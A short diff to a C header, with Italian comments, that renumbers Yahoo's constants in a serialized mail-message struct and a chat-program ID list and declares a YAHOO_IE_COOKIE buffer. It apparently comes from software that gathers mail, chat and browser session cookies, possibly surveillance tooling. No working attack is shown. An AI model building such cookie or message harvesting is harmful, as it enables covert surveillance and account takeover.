@@ -40,7 +40,7 @@ struct MailSerializedMessageHeader {
   FILETIME date;			 // data di ricezione approssimativa del messaggio
  #define MAIL_GMAIL     0x00000000
  #define MAIL_OUTLOOK	0x00000004
- #define MAIL_YAHOO		0x00000005
+ #define MAIL_YAHOO		0x00000006
   DWORD Program;
 };
 #pragma pack()
@@ -62,7 +62,7 @@ extern char YAHOO_IE_COOKIE[1024];
 
 #define CHAT_PROGRAM_FACEBOOK 0x02
 #define CHAT_PROGRAM_TWITTER  0x03
-#define CHAT_PROGRAM_YAHOO    0x04
+#define CHAT_PROGRAM_YAHOO    0x0F
 
 
 
